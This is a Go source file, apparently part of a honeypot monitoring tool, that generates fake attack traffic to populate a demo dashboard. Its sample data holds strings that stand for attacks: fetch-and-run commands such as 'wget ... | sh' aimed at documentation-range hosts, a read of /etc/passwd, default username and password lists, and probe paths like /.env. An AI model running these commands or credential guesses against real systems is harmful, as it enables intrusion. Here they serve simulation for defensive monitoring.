// Package demo генерирует правдоподобный трафик атак на ловушки, чтобы дашборд
// и события было на чём показать без настоящих атакующих.
//
// Все демо-события помечены сессией с префиксом storage.DemoSessionPrefix и
// удаляются одним вызовом storage.DeleteDemoEvents; настоящие события не трогаются.
package demo

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"math"
	"math/rand"
	"time"

	"honeyprower/internal/models"
	"honeyprower/internal/storage"
)

const (
	// History — за сколько времени назад заполняется история при запуске.
	History = 7 * 24 * time.Hour
	// historyEvents — сколько событий в истории (примерно; чем ближе к now, тем гуще).
	historyEvents = 3500
)

// Run заменяет старые демо-события свежей историей и, пока жив ctx, досыпает
// новые события каждые несколько секунд. Ловушек нет — ждёт, пока появятся.
func Run(ctx context.Context, s storage.Storage) {
	rnd := rand.New(rand.NewSource(time.Now().UnixNano()))
	g := newGenerator(rnd)

	if n, err := s.DeleteDemoEvents(ctx); err != nil {
		log.Printf("demo: clear old events: %v", err)
	} else if n > 0 {
		log.Printf("demo: removed %d old demo events", n)
	}

	backfilled := false
	for {
		traps, err := s.ListTraps(ctx)
		if err != nil {
			log.Printf("demo: list traps: %v", err)
		}
		traps = enabledTraps(traps)
		if len(traps) > 0 {
			now := time.Now()
			var batch []storage.DemoEvent
			if !backfilled {
				batch = g.history(traps, now.Add(-History), now, historyEvents)
			} else {
				batch = g.attack(traps, now, 1+rnd.Intn(4))
			}
			if err := s.AddDemoEvents(ctx, batch); err != nil {
				log.Printf("demo: add events: %v", err)
			} else if !backfilled {
				log.Printf("demo: generated %d events over the last %s for %d traps", len(batch), History, len(traps))
				backfilled = true
			}
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(time.Duration(2000+rnd.Intn(5000)) * time.Millisecond):
		}
	}
}

// Clear удаляет демо-события, оставшиеся с прошлого запуска с DEMO_DATA.
func Clear(ctx context.Context, s storage.Storage) {
	n, err := s.DeleteDemoEvents(ctx)
	if err != nil {
		log.Printf("demo: clear events: %v", err)
		return
	}
	if n > 0 {
		log.Printf("demo: DEMO_DATA is off, removed %d demo events", n)
	}
}

func enabledTraps(all []models.Trap) []models.Trap {
	out := all[:0:0]
	for _, t := range all {
		if t.Enabled {
			out = append(out, t)
		}
	}
	return out
}

// attacker — один источник: адрес и его «вес» (самые шумные встречаются чаще).
type attacker struct {
	ip     string
	weight float64
}

type generator struct {
	rnd       *rand.Rand
	attackers []attacker
	total     float64
	session   int
}

func newGenerator(rnd *rand.Rand) *generator {
	g := &generator{rnd: rnd}
	// Распределение как у реальных сканеров: несколько очень шумных адресов и длинный хвост.
	for i := 0; i < 60; i++ {
		w := 1 / math.Pow(float64(i+1), 1.1)
		g.attackers = append(g.attackers, attacker{ip: publicIP(rnd), weight: w})
		g.total += w
	}
	return g
}

// publicIP — случайный адрес вне частных, служебных и мультикаст-диапазонов.
func publicIP(rnd *rand.Rand) string {
	for {
		a := 1 + rnd.Intn(223)
		b := rnd.Intn(256)
		switch {
		case a == 10, a == 127, a == 0, a == 100 && b >= 64 && b < 128,
			a == 169 && b == 254, a == 172 && b >= 16 && b < 32, a == 192 && b == 168:
			continue
		}
		return fmt.Sprintf("%d.%d.%d.%d", a, b, rnd.Intn(256), 1+rnd.Intn(254))
	}
}

func (g *generator) pickAttacker() string {
	x := g.rnd.Float64() * g.total
	for _, a := range g.attackers {
		if x -= a.weight; x <= 0 {
			return a.ip
		}
	}
	return g.attackers[0].ip
}

// history раскладывает около n событий по окну [from, to): суточный ритм,
// рост к концу недели и пара «кампаний» — всплесков от одного адреса.
func (g *generator) history(traps []models.Trap, from, to time.Time, n int) []storage.DemoEvent {
	var out []storage.DemoEvent
	span := to.Sub(from).Seconds()
	// интенсивность по времени: вечером и ночью (UTC) атак больше, к концу недели — больше
	rate := func(ts float64) float64 {
		x := (ts - float64(from.Unix())) / span
		hour := float64(time.Unix(int64(ts), 0).UTC().Hour())
		return (0.6 + 0.8*x) * (1 + 0.5*math.Cos((hour-22)/24*2*math.Pi))
	}
	for len(out) < n {
		ts := float64(from.Unix()) + g.rnd.Float64()*span
		if g.rnd.Float64()*2.8 > rate(ts) {
			continue
		}
		out = append(out, g.attack(traps, time.Unix(int64(ts), 0), 1)...)
	}
	// всплески: подбор паролей с одного адреса за полчаса
	for c := 0; c < 3; c++ {
		at := from.Add(time.Duration(g.rnd.Float64() * float64(to.Sub(from)-time.Hour)))
		ip := g.pickAttacker()
		trap := traps[g.rnd.Intn(len(traps))]
		for i := 0; i < 60+g.rnd.Intn(80); i++ {
			ts := at.Add(time.Duration(g.rnd.Intn(1800)) * time.Second)
			out = append(out, g.event(trap, ip, ts, "auth"))
		}
	}
	return out
}

// attack — несколько событий одной сессии атакующего на случайной ловушке.
func (g *generator) attack(traps []models.Trap, at time.Time, sessions int) []storage.DemoEvent {
	var out []storage.DemoEvent
	for i := 0; i < sessions; i++ {
		trap := traps[g.rnd.Intn(len(traps))]
		ip := g.pickAttacker()
		script := scriptFor(trap.Class)
		steps := script[g.rnd.Intn(len(script))]
		g.session++
		for j, typ := range steps {
			ts := at.Add(time.Duration(j*(1+g.rnd.Intn(4))) * time.Second)
			ev := g.event(trap, ip, ts, typ)
			out = append(out, ev)
		}
	}
	return out
}

// scriptFor — типичные последовательности событий для класса ловушки.
func scriptFor(class string) [][]string {
	switch class {
	case "ssh", "high_interaction":
		return [][]string{
			{"connect", "auth", "auth", "auth", "disconnect"},
			{"connect", "auth", "command", "command", "disconnect"},
			{"connect", "disconnect"},
			{"scan"},
		}
	case "dialog", "medium_extra":
		return [][]string{
			{"connect", "auth", "auth", "disconnect"},
			{"connect", "data", "disconnect"},
			{"scan"},
		}
	case "http":
		return [][]string{
			{"request", "request", "request"},
			{"request", "auth"},
			{"scan"},
		}
	case "scada", "iec104":
		return [][]string{
			{"connect", "handshake", "command", "disconnect"},
			{"connect", "handshake", "disconnect"},
			{"scan"},
		}
	case "honeytoken":
		return [][]string{{"token"}, {"request"}}
	default: // banner, tarpit, port_listener, udp
		return [][]string{
			{"connect", "data", "disconnect"},
			{"connect", "disconnect"},
			{"scan"},
		}
	}
}

var (
	usernames = []string{"root", "root", "root", "admin", "admin", "ubuntu", "test", "user", "oracle", "pi", "postgres", "git", "ftpuser", "support"}
	passwords = []string{"123456", "123456", "admin", "password", "root", "12345678", "qwerty", "1q2w3e4r", "toor", "raspberry", "admin123", "P@ssw0rd", "111111", "changeme"}
	commands  = []string{"uname -a", "cat /proc/cpuinfo", "wget http://203.0.113.7/x.sh -O- | sh", "cd /tmp; curl -O http://198.51.100.4/bot", "id", "free -m", "crontab -l", "cat /etc/passwd", "nproc"}
	paths     = []string{"/", "/wp-login.php", "/admin", "/.env", "/phpmyadmin/", "/cgi-bin/luci", "/actuator/health", "/.git/config", "/login", "/boaform/admin/formLogin"}
	agents    = []string{"Mozilla/5.0 zgrab/0.x", "curl/7.88.1", "python-requests/2.31", "Go-http-client/1.1", "masscan/1.3"}
	scanPorts = []int{21, 22, 23, 80, 443, 445, 502, 1433, 2404, 3306, 3389, 5900, 6379, 8080}
)

func (g *generator) pick(list []string) string { return list[g.rnd.Intn(len(list))] }

func (g *generator) event(trap models.Trap, ip string, ts time.Time, typ string) storage.DemoEvent {
	in := models.IngestEvent{
		TrapClass: trap.Class,
		EventType: typ,
		Proto:     "tcp",
		SrcIP:     ip,
		SrcPort:   1024 + g.rnd.Intn(64000),
		DstPort:   trap.Port,
		Session:   fmt.Sprintf("%s%x", storage.DemoSessionPrefix, g.session),
		TS:        float64(ts.Unix()) + g.rnd.Float64(),
	}
	var data any
	switch typ {
	case "auth":
		u, p := g.pick(usernames), g.pick(passwords)
		in.Username, in.Password = &u, &p
	case "command":
		data = map[string]any{"line": g.pick(commands)}
	case "request":
		method := "GET"
		if g.rnd.Intn(5) == 0 {
			method = "POST"
		}
		data = map[string]any{"method": method, "path": g.pick(paths), "user_agent": g.pick(agents)}
	case "scan":
		ports := make([]int, 0, 4)
		for _, i := range g.rnd.Perm(len(scanPorts))[:2+g.rnd.Intn(4)] {
			ports = append(ports, scanPorts[i])
		}
		data = map[string]any{"ports": ports}
	case "token":
		data = map[string]any{"label": g.pick([]string{"aws-keys.txt", "backup.sql", "passwords.xlsx"})}
	case "disconnect":
		data = map[string]any{"duration": g.rnd.Intn(120), "bytes_in": g.rnd.Intn(4096)}
	case "data":
		data = map[string]any{"text": g.pick([]string{"GET / HTTP/1.0", "\\x16\\x03\\x01", "HELP", "INFO"})}
	case "handshake":
		data = map[string]any{"text": "STARTDT act"}
	}
	if data != nil {
		in.Data, _ = json.Marshal(data)
	}
	return storage.DemoEvent{TrapID: trap.ID, Event: in}
}
